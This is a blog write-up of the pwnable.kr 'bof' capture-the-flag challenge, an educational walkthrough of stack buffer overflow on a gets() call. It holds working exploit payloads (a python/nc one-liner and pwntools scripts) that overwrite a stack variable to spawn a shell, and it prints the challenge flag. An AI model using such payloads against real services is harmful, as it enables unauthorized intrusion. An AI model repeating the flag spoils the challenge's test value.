---
title: "Basic Buffer Overflow Vulnerability"
excerpt: "pwnable.kr challenge: bof"
date: 2020-03-04T02:41:11-05:00
categories:
 - pwn practice
---

# pwnable.kr: Intro to Buffer Overflow

> Nana told me that buffer overflow is one of the most common software vulnerability. Is that true?
>
> Download: http://pwnable.kr/bin/bof
>
> Download: http://pwnable.kr/bin/bof.c
>
> Running at: nc pwnable.kr 9000

See:
* [Brief overview of why gets is bad](https://faq.cprogramming.com/cgi-bin/smartfaq.cgi?answer=1049157810&id=1043284351).
* [University of Maryland paper on the Morris worm](https://www.cs.umd.edu/class/fall2019/cmsc818O/papers/morris-worm.pdf) (unrelated directly to this challenge, but that worm used a `gets` vulnerability in Fingerd.

## Given

So for this, we're given two downloads, which look to be an executable and the c source code for that executable:
* Executable -- `http://pwnable.kr/bin/bof`
* Source -- `http://pwnable.kr/bin/bof.c`

And then a location of which the vulnerable program is currently running:
* `nc pwnable.kr 9000`

## First, download and try out

```bash
# Just store in current working dir as same name
wget http://pwnable.kr/bin/bof
wget http://pwnable.kr/bin/bof.c
```

See what happens if we connect to the above:

```bash
nc pwnable.kr 9000
<just sits here>
```

Maybe it's waiting for a prompt?

```bash
<just sits here, press enter>
overflow me :
Nah..
```

So it does look like it's taking input. And passed on that, something we need to overflow based on input parameter. Which we didn't do, so it printed `Nah..`

I assume the executable `bof` is what's running at that destination, so lets look at the source.

## Inspect files

`bof`:

```
file bof
bof: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=ed643dfe8d026b7238d3033b0d0bcc499504f273, not stripped
```

So again, executable. [Specifically](https://www.linuxtopia.org/online_books/an_introduction_to_gcc/gccintro_89.html), it's an executable that:
* It is a `32-bit` executable, compiled for a Little Endian (`LSB`) machine, and and compiled for the `Intel (80)386` and compatible processors.
* `version 1`: This is the version of the internal format of the file.
* `dynamically linked` -- means that third library code is not pulled in until the program is ran (as opposed to it being statically linked, in which the code would be stuffed in during compile time -- see [here](https://stackoverflow.com/a/311889))
* `ELF` -- [Executable and Linkable Format](https://en.wikipedia.org/wiki/Executable_and_Linkable_Format); man page [here](http://man7.org/linux/man-pages/man5/elf.5.html). See [here](https://en.wikipedia.org/wiki/Comparison_of_executable_file_formats) for a comparison of executable file formats; for now, it doesn't mean much to us.
* `not stripped` is a reference to the fact that when compiled, extra debug information not necesarry for the execution of the file (aka symbol table). See [the manpage for strip](https://linux.die.net/man/1/strip) for more info on options.

## Run it

```bash
./bof
zsh: exec format error: ./bof
```

RIP - 32 bit executable on a 64 bit Mac, that won't work. Would be nice to have 32 bit VM here; going to retry in a container that has among other things, [peda](https://github.com/longld/peda).

```bash
# Get a container
# Build it
# Start it
# docker cp executable to it:
docker cp bof <container id>:<container path>
# go inside, try it:
root@6ccac6c55240:~# ./bof
overflow me :

Nah..
```

Sweet! So we can poke around with the binary in here.

OK, let's look at the source code.:

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
void func(int key){
	char overflowme[32];
	printf("overflow me : ");
	gets(overflowme);	// smash me!
	if(key == 0xcafebabe){
		system("/bin/sh");
	}
	else{
		printf("Nah..\n");
	}
}
int main(int argc, char* argv[]){
	func(0xdeadbeef);
	return 0;
}
```
So, we're dealing with two functions, `main` and `func`.

## `main`

Immediately calling `func` with argument `0xdeadbeef`:

```bash
	func(0xdeadbeef);
```

## `func`
We see it's parameter is an `int`. It first defines a `char` buffer, of size 32 bytes in length (31 for data, plus one for the null terminator), named `overflowme`.

Then, it prints the overflow me message, after which it uses `gets` to read user input into the `char` buffer.

Lastly, it compares the value of `key` (which is the passed in value of the function to `0xcafebabe`, and if so gives us a shell (to which we can cat the flag.

## Takeaway
We need to pass in a value that will get read in with `gets` such that we overflow the buffer, and replace wherever the key is living in memory with `0xcafebabe`. This is because `gets` is for bad guys:

> gets() has only received the name of the array (a pointer), it does not know how big the array is, and it is impossible to determine this from the pointer alone. When the user enters their text, gets() will read all available data into the array, this will be fine if the user is sensible and enters less than 99 bytes. However, if they enter more than 99, gets() will not stop writing at the end of the array. Instead, it continues writing past the end and into memory it doesn't own.

So we're going to need to pass in some amount of data, and then `0xcafebabe` at the right spot such that we clobber the original value of `key`.

## First, we gotta find where things are

Need to inspect the executable while it's running to see where certain values live in memory. Mainly, where `key` gets stored relative to where our input that gets read in via `gets` is stored, so that we know how much to enter before sending the `0xcafebabe`.

As mentioned above, using the container:

```bash
root@6ccac6c55240:~# peda bof
Reading symbols from bof...
(No debugging symbols found in bof)
gdb-peda$
```

* [Unofficial guide on hexcellents for peda](http://security.cs.pub.ro/hexcellents/wiki/kb/toolset/peda).
* [peda cheatsheet](https://github.com/ebtaleb/peda_cheatsheet/blob/master/peda.md).


> The list of commands can be read by typing `peda`:

```
gdb-peda$ peda
PEDA - Python Exploit Development Assistance for GDB
For latest update, check peda project page: https://github.com/longld/peda/
List of "peda" subcommands, type the subcommand to invoke it:
aslr -- Show/set ASLR setting of GDB
asmsearch -- Search for ASM instructions in memory
...
Type "help" followed by subcommand for full documentation.
gdb-peda$
```

Woof, that's a lot of stuff. For now, we'll ignore it. Just try running it from within peda:

```bash
gdb-peda$ r
Starting program: /root/bof
overflow me :
aaaaaaaaaaaaa
Nah..
[Inferior 1 (process 64) exited normally]
Warning: not running
gdb-peda$
```

OK, so it seemed to run. So now we need a way to stop the execution after we start main but before the program quits, so we can see where our input gets stored in relation to the key.

First try:
```bash
gdb-peda$ break main
Breakpoint 1 at 0x5655568d
gdb-peda$ r
...
[-------------------------------------code-------------------------------------]
   0x56555689 <func+93>:	ret
   0x5655568a <main>:	push   ebp
   0x5655568b <main+1>:	mov    ebp,esp
=> 0x5655568d <main+3>:	and    esp,0xfffffff0
   0x56555690 <main+6>:	sub    esp,0x10
   0x56555693 <main+9>:	mov    DWORD PTR [esp],0xdeadbeef
   0x5655569a <main+16>:	call   0x5655562c <func>
   0x5655569f <main+21>:	mov    eax,0x0
[------------------------------------stack-------------------------------------]
[------------------------------------stack-------------------------------------]
0000| 0xffffd728 --> 0x0
0004| 0xffffd72c --> 0xf7de3fb9 (<__libc_start_main+249>:	add    esp,0x10)
0008| 0xffffd730 --> 0x1
0012| 0xffffd734 --> 0xffffd7c4 --> 0xffffd8d5 ("/root/bof")
0016| 0xffffd738 --> 0xffffd7cc --> 0xffffd8df ("LESSOPEN=| /usr/bin/lesspipe %s")
0020| 0xffffd73c --> 0xffffd754 --> 0x0
0024| 0xffffd740 --> 0x1
0028| 0xffffd744 --> 0x0
...
```

OK, so can see we're sitting at main right now. Let's continue.

```bash
gdb-peda$ c
Continuing.
overflow me :
aaaaaaaaa
Nah..
[Inferior 1 (process 66) exited normally]
Warning: not running
gdb-peda$
```

So, we'll need another breakpoint in `func` so we can look at the stack.

```bash
gdb-peda$ break func
Breakpoint 2 at 0x56555632
gdb-peda$ r
gdb-peda$ c
...
Breakpoint 2, 0x56555632 in func ()
gdb-peda$ gdb-peda$ context code
[-------------------------------------code-------------------------------------]
   0x5655562c <func>:	push   ebp
   0x5655562d <func+1>:	mov    ebp,esp
   0x5655562f <func+3>:	sub    esp,0x48
=> 0x56555632 <func+6>:	mov    eax,gs:0x14
   0x56555638 <func+12>:	mov    DWORD PTR [ebp-0xc],eax
   0x5655563b <func+15>:	xor    eax,eax
   0x5655563d <func+17>:	mov    DWORD PTR [esp],0x5655578c
   0x56555644 <func+24>:	call   0xf7e36b70 <__GI__IO_puits>
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
```

OK, we're sitting in func now. Still don't see the comparison in the code based on the above, so lets step through until it looks to pop up.

After 4 `step`s from the break in `func`:

```bash
[-------------------------------------code-------------------------------------]
   0x56555638 <func+12>:	mov    DWORD PTR [ebp-0xc],eax
   0x5655563b <func+15>:	xor    eax,eax
   0x5655563d <func+17>:	mov    DWORD PTR [esp],0x5655578c
=> 0x56555644 <func+24>:	call   0xf7e36b70 <__GI__IO_puts>
   0x56555649 <func+29>:	lea    eax,[ebp-0x2c]
   0x5655564c <func+32>:	mov    DWORD PTR [esp],eax
   0x5655564f <func+35>:	call   0xf7e360c0 <_IO_gets>
   0x56555654 <func+40>:	cmp    DWORD PTR [ebp+0x8],0xcafebabe
Guessed arguments:
arg[0]: 0x5655578c ("overflow me : ")
[------------------------------------stack-------------------------------------]
```

Ok, so looks like we'll want to setup a break at `0x56555654` so that we can see where our input lives in the stack vs the key.

```bash
gdb-peda$ peda bof
gdb-peda$ break *0x56555654
gdb-peda$ r
Starting program: /root/bof
overflow me :
AAAAAAAAAAAAAAAAAAA
...
[-------------------------------------code-------------------------------------]
   0x56555649 <func+29>:	lea    eax,[ebp-0x2c]
   0x5655564c <func+32>:	mov    DWORD PTR [esp],eax
   0x5655564f <func+35>:	call   0xf7e360c0 <_IO_gets>
=> 0x56555654 <func+40>:	cmp    DWORD PTR [ebp+0x8],0xcafebabe
   0x5655565b <func+47>:	jne    0x5655566b <func+63>
   0x5655565d <func+49>:	mov    DWORD PTR [esp],0x5655579b
   0x56555664 <func+56>:	call   0xf7e0a8b0 <__libc_system>
   0x56555669 <func+61>:	jmp    0x56555677 <func+75>
[------------------------------------stack-------------------------------------]
0000| 0xffffd6c0 --> 0xffffd6dc ('A' <repeats 19 times>)
0004| 0xffffd6c4 --> 0xffffd7c4 --> 0xffffd8d5 ("/root/bof")
0008| 0xffffd6c8 --> 0xf7fae000 --> 0x1e8d6c
0012| 0xffffd6cc --> 0xf7faca60 (0xf7faca60)
0016| 0xffffd6d0 --> 0x0
0020| 0xffffd6d4 --> 0xf7fae000 --> 0x1e8d6c
0024| 0xffffd6d8 --> 0xf7ffc840 --> 0x0
0028| 0xffffd6dc ('A' <repeats 19 times>)
[------------------------------------------------------------------------------]
```
OK - so from the peda `context all` that gets run whenever a breakpoint is ran, we can see in the `context code` that we're sitting at the `==` operation in func, and that from the `context stack` section, we can see that our `AAAA..` input begins at `0xffffd6dc`:

```bash
0028| 0xffffd6dc ('A' <repeats 19 times>)
```

So - now to find `0xdeadbeef`.

Also see: [better dissasembly with gdb peda](https://eugenekolo.com/blog/better-disassembly-with-gdb-peda/):
> ... Save in file: ~/.gdbinit

```
source ~/peda/peda.py
set disassembly-flavor intel
set pagination off
catch exec
# Keep a history of all the commands typed. Search is possible using ctrl-r
set history save on
set history filename ~/.gdb_history
set history size 32768
set history expansion on
```
```
# Commands to use in GDB/PEDA
b <func_name> - classic breakpoint
b *0x123123 - break at address 0x123123
pdisas - better disass
vmmap - print mapped memory
pattern create 2000 - generate cyclic pattern
telescope 200 - pretty print the stack, 200 ahead
context all -  print registers, stack, code, everything good
xormem - xor a memory region with a key
procinfo - display various info from /proc/pid/
find “/bin/sh” libc - look for /bin/sh in libc
find 0xdeadbeef all - look for 0xdeadbeef in all mapped memory
find “..\x04\x08” 0x08048000 0x08049000 - regex search a memory region

dumprop -  show ROP gadgets
checksec - list security settings of binary
readelf - get information about the elf file
```
OK - telescope looks of interest.

## telescope

Looks like in `peda` we can use `telescope XXXX` to view `XXXX` lines ahead of the stack:

```bash
gdb-peda$ telescope 50
...
0028| 0xffffd6dc ('A' <repeats 19 times>)
0032| 0xffffd6e0 ('A' <repeats 15 times>)
0036| 0xffffd6e4 ('A' <repeats 11 times>)
0040| 0xffffd6e8 ("AAAAAAA")
0044| 0xffffd6ec --> 0x414141 ('AAA')
...
0080| 0xffffd710 --> 0xdeadbeef
```

Hey, look, there's `deadbeef`! Sitting at `0xffffd710` And our input, which looks to start at `0xffffd6dc`.

## gdb -- x/?x $sp - show stack memory

We can also use `x/?x $sp` where `?` is an integer to represent the number of **words** to be shown on the stack:

```bash
gdb-peda$ x/50x $sp
0xffffd6c0:	0xffffd6dc	0xffffd7c4	0xf7fae000	0xf7faca60
0xffffd6d0:	0x00000000	0xf7fae000	0xf7ffc840	0x41414141
0xffffd6e0:	0x41414141	0x41414141	0x41414141	0x00414141
0xffffd6f0:	0xf7fae3fc	0x00040000	0x56556ff4	0x613d7500
0xffffd700:	0x56556ff4	0xf7fae000	0xffffd728	0x5655569f
0xffffd710:	0xdeadbeef	0x00000000	0x565556b9	0x00000000
...
```

Here, for example, the hex `0x41414141` is one _word_, which is equal to 4 chars in little endian. So that means one word of `4141...` is `AAAA`.

So, between our first word and `deadbeef` there's 13 words, and then deadbeef. So, we need `13*4` chars == 52.

It's also more clear here that despite our first set of `AAA..`s appearing on `0xffffd6d0`, they actually don't start until the third word (i.e. its in the last column there). So really, our input starts at:

```python
python
>>> hex(0xffffd6d0 + 12)
0xffffd6dc
# Remember, one word size on 32 bit machine is 4 bytes so 4*3=12
```

Which matches what peda showed.

## X marks the spot

OK - so we know `deadbeef` lives at `0xffffd710` and our input starts at `0x0xffffd6dc`. We can figure out what we need to send based on that (like we already did above):

```python
>>> 0xffffd710 - 0xffffd6dc
52
```

Send it something 52 bytes, and then `0xcafebabe` (__*in little endian*__):

```bash
 python2 -c "print 'A' * 52 + '\xbe\xba\xfe\xca'" | nc pwnable.kr 9000
*** stack smashing detected ***: /home/bof/bof terminated
overflow me :
```

Hm.. that didn't work out. Seems like it immediately closes the connection, since we get it to execute:

```c
		system("/bin/sh");
```

But that then immediately closes from reading stdin which is nothing.

Reading online, can do `cat` stuff to keep it open:

* [Here](https://stackoverflow.com/a/54376942)
* [And here](https://reverseengineering.stackexchange.com/questions/11777/how-to-effectively-bypass-gcc-stack-smashing-detection)

Keeping `/bin/sh` open:

```bash
(python2 -c "print 'A' * 52 + '\xbe\xba\xfe\xca'"; cat) | nc pwnable.kr 9000
ls
bof
bof.c
flag
log
log2
super.pl
cat flag
daddy, I just pwned a buFFer :)
^C
```
flag is `daddy, I just pwned a buFFer :)`


## post-solve note -- pwn python
So, there's usually lots of ways to solve these types of things. And reading others solutions on the problem after you solve it is sometimes beneficial as well.

In doing other reading as well, I've come across the [pwntools python library](http://docs.pwntools.com/en/stable/).
> pwntools is a CTF framework and exploit development library. Written in Python, it is designed for rapid prototyping and development, and intended to make exploit writing as simple as possible.

```
# brew install pwntools
```

### [pwntools - getting started](http://docs.pwntools.com/en/stable/intro.html)

```
from pwn import *
```
> ... You can now assemble, disassemble, pack, unpack, and many other things with a single function.
>
> [full list of everthing that's available after `from pwn import *`](http://docs.pwntools.com/en/stable/globals.html)

**Making Connections** -- this seems good, since we have to run the executable via `nc`.
> [pwnlib.tubes — Talking to the World!](http://docs.pwntools.com/en/stable/tubes.html#module-pwnlib.tubes)
>
> This exposes a standard interface to talk to processes, sockets, serial ports, and all manner of things, along with some nifty helpers for common tasks. For example, remote connections via pwnlib.tubes.remote.

```
conn = remote('pwnable.kr', 9000)
conn.send(b'AAAAAAAAAAAAAAA\n')
conn.recvuntil(b' ', drop=True)
conn.recvline()
conn.close()
```

Gives us:

```
./py_pwn.py
[+] Opening connection to pwnable.kr on port 9000: Done
[*] Closed connection to pwnable.kr port 9000
```

**context.log_level**
> = 'debug'
>
> Will cause all of the data sent and received by a tube to be printed to the screen.

```python
#!/usr/bin/env python
from pwn import *

context.log_level = 'debug'

conn = remote('pwnable.kr', 9000)
conn.send('A'*52+'\xbe\xba\xfe\xca')
conn.close()
```
Gives us now:

```
[+] Opening connection to pwnable.kr on port 9000: Done
[DEBUG] Sent 0x38 bytes:
    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    *
    00000030  41 41 41 41  be ba fe ca                            │AAAA│····│
    00000038
[*] Closed connection to pwnable.kr port 9000
```

So we need something to interact with, since it didn't spit out `nah` this time.

> Not only can you interact with processes programmatically, but you can actually interact with processes.

Seems like the following should do the trick:

```python
#!/usr/bin/env python
from pwn import *

#context.log_level = 'debug'

conn = remote('pwnable.kr', 9000)
conn.send('A'*52+'\xbe\xba\xfe\xca')
conn.interactive()
```

Which it does:

```
python3 py_pwn.py
[+] Opening connection to pwnable.kr on port 9000: Done
[*] Switching to interactive mode
$ cat flag
$ cat flag
daddy, I just pwned a buFFer :)
$
[*] Interrupted
```
Though, something weird seems to be happening where the first command doesn't register anything?

### post-post note

Duh -- the above "first command not working" is because when we use `.send` to send our payload, we're not including a newline at the end of the input.

So, we can add a `+'\n'` to there and get around it. __*Or*__, we can use the handy function `sendline` which is already a part of pwntools:

```
# venv setup
python3 -m venv ./bof_venv
source bof_venv/bin/activate
pip3 install pwntools

# run
python3 pwn_bof.py
[+] Opening connection to pwnable.kr on port 9000: Done
[*] Switching to interactive mode
$ cat flag
daddy, I just pwned a buFFer :)
$
[*] Interrupted

# venv teardown
deactivate
rm -rf ./bof_venv
```
Sweet!

For this code, see my [Git repo](https://github.com/bigpick/pwnable.kr) for pwnable.kr practice code.
